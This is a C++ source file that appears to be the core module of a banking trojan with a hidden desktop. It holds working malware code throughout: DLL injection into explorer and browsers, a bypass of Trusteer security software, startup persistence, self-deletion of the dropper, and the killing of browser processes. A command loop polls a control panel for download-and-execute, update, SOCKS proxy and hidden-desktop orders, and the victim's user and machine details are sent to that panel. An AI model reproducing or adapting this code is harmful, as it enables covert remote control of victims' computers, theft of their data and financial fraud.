#include "Bot.h"
#include "Socks.h"
#include "HiddenDesktop.h"

BYTE  *g_dll32 = NULL;
BYTE  *g_dll64 = NULL;
int    g_dll32size;
int    g_dll64size;
HANDLE g_hBotExe;
HANDLE g_hBotMutex;
DWORD  g_hBrowserPids2kill[MAX_PATH] = { 0 };

static void InjectPid(DWORD pid)
{
   HANDLE hProcess = Funcs::pOpenProcess
   (
      PROCESS_VM_OPERATION |
      PROCESS_VM_READ | 
      PROCESS_VM_WRITE | 
      PROCESS_CREATE_THREAD | 
      PROCESS_QUERY_INFORMATION, 
      FALSE, 
      pid
   );
   BOOL   x64      = IsProcessX64(hProcess);
   BYTE *dllBuffer = x64 ? g_dll64 : g_dll32;
   BOOL injected   = InjectDll(dllBuffer, hProcess, x64);
   Funcs::pCloseHandle(hProcess);
}

static DWORD WINAPI InjectionServerThread(LPVOID lpParam)
{
   char pipeName[MAX_PATH] = { 0 };
   char botId[BOT_ID_LEN]  = { 0 };
   GetBotId(botId);
   Funcs::pWsprintfA(pipeName, Strs::pipeName, botId); 
   HANDLE hPipe = Funcs::pCreateNamedPipeA
   (
      pipeName, 
      PIPE_ACCESS_DUPLEX, 
      PIPE_TYPE_BYTE, 
      PIPE_UNLIMITED_INSTANCES, 
      0, 
      0,
      0, 
      NULL
   );
   for(;;)
   {
      Funcs::pConnectNamedPipe(hPipe, NULL);
      DWORD pid;
      BOOL  trusteer;
      DWORD readWrite;
      Funcs::pReadFile(hPipe, &pid, sizeof(pid), &readWrite, NULL);
      Funcs::pReadFile(hPipe, &trusteer, sizeof(trusteer), &readWrite, NULL);
      if(trusteer)
      {
         char  browserPath[MAX_PATH] = { 0 };
         int   browserPathLen;
         Funcs::pReadFile(hPipe, &browserPathLen, sizeof(browserPathLen), &readWrite, NULL);
         Funcs::pReadFile(hPipe, browserPath, browserPathLen, &readWrite, NULL);

         char  commandLine[MAX_PATH] = { 0 };
         int   commandLineLen;
         Funcs::pReadFile(hPipe, &commandLineLen, sizeof(commandLineLen), &readWrite, NULL);
         Funcs::pReadFile(hPipe, commandLine, commandLineLen, &readWrite, NULL);
         pid = BypassTrusteer(NULL, browserPath, commandLine);
      }
      InjectPid(pid);
      Funcs::pDisconnectNamedPipe(hPipe);
   }
   return 0;
}

static void LockBotExe()
{
   CHAR botPath[MAX_PATH] = { 0 };
   GetInstallPath(botPath);
   g_hBotExe = Funcs::pCreateFileA(botPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
}

static BOOL DownloadExecute(char *url, char *tempPath, BOOL execute, BOOL validateExe)
{
   URL_COMPONENTSA urlComponents = { 0 };
   urlComponents.dwStructSize = sizeof(urlComponents);

   char host[MAX_PATH] = { 0 };
   char path[MAX_PATH] = { 0 };
   urlComponents.lpszHostName     = host;
   urlComponents.dwHostNameLength = MAX_PATH;

   urlComponents.lpszUrlPath     = path;
   urlComponents.dwUrlPathLength = MAX_PATH;

   if(Funcs::pInternetCrackUrlA(url, Funcs::pLstrlenA(url), ICU_DECODE, &urlComponents) && urlComponents.nScheme == INTERNET_SCHEME_HTTP)
   {
      HttpRequestData request = { 0 };
      request.host            = urlComponents.lpszHostName;
      request.port            = urlComponents.nPort;
      request.path            = urlComponents.lpszUrlPath;
      request.post            = FALSE;
      if(HttpSubmitRequest(request))
      {
         if((validateExe && VerifyPe(request.outputBody, request.outputBodySize)) || !validateExe)
         {
            char *fileName = Funcs::pPathFindFileNameA(path);
            if(fileName != path)
            {
               Funcs::pGetTempPathA(MAX_PATH, tempPath);
               Funcs::pGetTempFileNameA(tempPath, "", 0, tempPath);
               Funcs::pLstrcatA(tempPath, ".");
               Funcs::pLstrcatA(tempPath, fileName);
               HANDLE hFile = Funcs::pCreateFileA(tempPath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
               if(hFile)
               {
                  DWORD written;
                  if(Funcs::pWriteFile(hFile, request.outputBody, request.outputBodySize, &written, NULL))
                  {
                     Funcs::pFree(request.outputBody);
                     Funcs::pCloseHandle(hFile);
                     if(!execute)
                        return TRUE;
                     if(Funcs::pShellExecuteA(NULL, Strs::open, tempPath, NULL, NULL, SW_SHOW) > (HINSTANCE) 32)
                        return TRUE; 
                  }
                  Funcs::pCloseHandle(hFile);    
               } 
            }
         }  
      }
      Funcs::pFree(request.outputBody);
   }
   return FALSE;
}

enum CommandType { COMMAND_DL_EXEC, COMMAND_HIDDEN_DESKTOP, COMMAND_SOCKS, COMMAND_UPDATE };

static void HandleCommand(CommandType type, char *param)
{
   switch(type)
   {
      case COMMAND_DL_EXEC:
      {
         char tempPath[MAX_PATH] = { 0 };
         DownloadExecute(param, tempPath, TRUE, FALSE);
         break;
      }
      case COMMAND_UPDATE:
      {
         char tempPath   [MAX_PATH] = { 0 };
         char installPath[MAX_PATH] = { 0 };
         if(DownloadExecute(param, tempPath, FALSE, TRUE))
         {
            GetInstallPath(installPath);
            Funcs::pCloseHandle(g_hBotExe);
            Funcs::pCopyFileA(tempPath, installPath, FALSE);
            LockBotExe();
         }
         break;
      }
      case COMMAND_SOCKS:
      case COMMAND_HIDDEN_DESKTOP:
      {
         char *host = param;
         char *port = Funcs::pStrChrA(param, ':');
         if(port)
         {
            *port = 0;
            ++port;
            int portInt = Funcs::pStrtol(port, NULL, 10);
            if(type == COMMAND_SOCKS)
               StartSocksClient(host, portInt);
            else
               StartHiddenDesktop(host, portInt);
         }
         break;
      }
   }
}

#pragma region hackBrowsers
/*
   For the niche case where someone never closes his browser or shuts down his computer
   I also can't just restart the browser since I need to disable spdy/http2
*/
static DWORD WINAPI KillBrowsersThread(LPVOID lpParam)
{
   Funcs::pSleep(1000 * 60 * 30);
   for(int i = 0; i < sizeof(g_hBrowserPids2kill); ++i)
   {
      if(!g_hBrowserPids2kill[i])
         break;
      HANDLE hProcess = Funcs::pOpenProcess(PROCESS_TERMINATE, FALSE, g_hBrowserPids2kill[i]);
      Funcs::pTerminateProcess(hProcess, 0);
      Funcs::pCloseHandle(hProcess);
   }
   return 0;
}

static void StartKillBrowsersThread()
{
   PROCESSENTRY32 processEntry = { 0 };
   processEntry.dwSize         = sizeof(processEntry);
   HANDLE hProcessSnap         = Funcs::pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
   DWORD browserPidsNum        = 0;
   Funcs::pProcess32First(hProcessSnap, &processEntry);
   do
   {
      if(Funcs::pLstrcmpiA(processEntry.szExeFile, Strs::chromeExe) == 0 ||
         Funcs::pLstrcmpiA(processEntry.szExeFile, Strs::firefoxExe) == 0 ||
         Funcs::pLstrcmpiA(processEntry.szExeFile, Strs::iexploreExe) == 0)
      {
         if(sizeof(g_hBrowserPids2kill) > browserPidsNum)
         {
            g_hBrowserPids2kill[browserPidsNum] = processEntry.th32ProcessID;
            ++browserPidsNum;
         }
      }
   } while(Funcs::pProcess32Next(hProcessSnap, &processEntry));
   Funcs::pCloseHandle(hProcessSnap);
   Funcs::pCreateThread(NULL, 0, KillBrowsersThread, NULL, 0, NULL);
}
#pragma endregion

static void SendBotInfo()
{
   char             command[MAX_PATH]  = { 0 };
   char            *userNameA;
   char            *compNameA;
   wchar_t          userName[MAX_PATH] = { 0 };
   wchar_t          compName[MAX_PATH] = { 0 };
   DWORD            nameSize           = MAX_PATH;
   SYSTEM_INFO      info               = { 0 };
   OSVERSIONINFOEXA osVersion          = { 0 };

   Funcs::pGetUserNameW(userName, &nameSize);
   nameSize = MAX_PATH;
   Funcs::pGetComputerNameW(compName, &nameSize);

   userNameA = Utf16toUtf8(userName);
   compNameA = Utf16toUtf8(compName);

   Funcs::pGetNativeSystemInfo(&info);
   osVersion.dwOSVersionInfoSize = sizeof(osVersion);
   Funcs::pGetVersionExA((LPOSVERSIONINFOA) &osVersion); 
   Funcs::pWsprintfA
   (
      command, 
      Strs::infoRequest, 
      osVersion.dwMajorVersion, 
      osVersion.dwMinorVersion, 
      osVersion.wServicePackMajor, 
      !(osVersion.wProductType == VER_NT_WORKSTATION), 
      compNameA, 
      userNameA, 
      (info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
   );
   char *toFree = PanelRequest(command, NULL);
   Funcs::pFree(toFree);
}

static DWORD WINAPI CommandPollThread(LPVOID lpParam)
{ 
   for(;;)
   {
      //just placed here because we poll
      char installPath[MAX_PATH] = { 0 };
      GetInstallPath(installPath);
      SetStartupValue(installPath);
      //start of real command poll
      char command[32]    = { 0 };
      Funcs::pLstrcpyA(command, Strs::pingRequest);
      char *startResponse = PanelRequest(command, NULL);
      char *response      = startResponse;
      if(response)
      {
         if(!Funcs::pLstrcmpA(response, "0"))
            SendBotInfo();
         else
         {
            for(;;)
            {
               char *commandTypeStr = response;
               char *param       = Funcs::pStrChrA(response, '|');
               char *nextCommand = Funcs::pStrStrA(response, Strs::winNewLine);
               if(nextCommand)
               {
                  *nextCommand = 0;
                  response     = nextCommand + 2;
               }
               if(param)
               {
                  *param = 0;
                  ++param;
                  CommandType type = (CommandType) Funcs::pStrtol(commandTypeStr, NULL, 10);
                  HandleCommand(type, param);  
               }
               if(!nextCommand)
                  break;
            }
         }      
      }
      Funcs::pFree(startResponse);
      Funcs::pSleep(POLL); 
   }
   return 0;
}

static HANDLE InjectExplorer()
{
   DWORD pid = GetPidExplorer();
   InjectPid(pid);
   return Funcs::pOpenProcess(SYNCHRONIZE, FALSE, pid);
}

static void UpdateDllsThread()
{
   for(;;)
   {
      GetDlls(NULL, NULL, TRUE);
      Funcs::pSleep(1000 * 60 * 5);
   }
}

static DWORD WINAPI InjectExplorerThread(LPVOID lpParam)
{
   for(;;)
   {
      HANDLE hExplorer = InjectExplorer();
      Funcs::pWaitForSingleObject(hExplorer, INFINITE);
      Funcs::pCloseHandle(hExplorer);
   }
   return 0;
}

static void Melt()
{
   char temp[MAX_PATH];
   GetTempPathBotPrefix(temp);
   HANDLE hFile = Funcs::pCreateFileA
   (
      temp, 
      GENERIC_READ, 
      0, 
      NULL, 
      OPEN_EXISTING, 
      FILE_ATTRIBUTE_NORMAL, 
      NULL
   );
   if(hFile != INVALID_HANDLE_VALUE)
   {
      char exeZoneId[MAX_PATH];
      GetInstallPath(exeZoneId);
      Funcs::pLstrcatA(exeZoneId, Strs::zoneId);
      Funcs::pDeleteFileA(exeZoneId);

      DWORD fileSize = Funcs::pGetFileSize(hFile, NULL);
      DWORD read;
      char deletePath[MAX_PATH];
      Funcs::pReadFile(hFile, deletePath, fileSize, &read, NULL);
      Funcs::pCloseHandle(hFile);
      Funcs::pDeleteFileA(deletePath);
      Funcs::pDeleteFileA(temp);
      StartKillBrowsersThread(); //on first run
   }
}

void StartBot()
{          
   char botId[BOT_ID_LEN] = { 0 };
   GetBotId(botId);
   HANDLE g_hBotMutex = Funcs::pCreateMutexA(NULL, TRUE, botId);
   if(Funcs::pGetLastError() == ERROR_ALREADY_EXISTS)
      Funcs::pExitProcess(0);

   LockBotExe();

   GetDlls(&g_dll32, &g_dll64, FALSE);
   Melt();
   Funcs::pCreateThread(NULL, 0, InjectExplorerThread, NULL, 0, NULL);
   Funcs::pCreateThread(NULL, 0, InjectionServerThread, NULL, 0, NULL);
   SendBotInfo();
   Funcs::pCreateThread(NULL, 0, CommandPollThread, NULL, 0, NULL);
   UpdateDllsThread();
}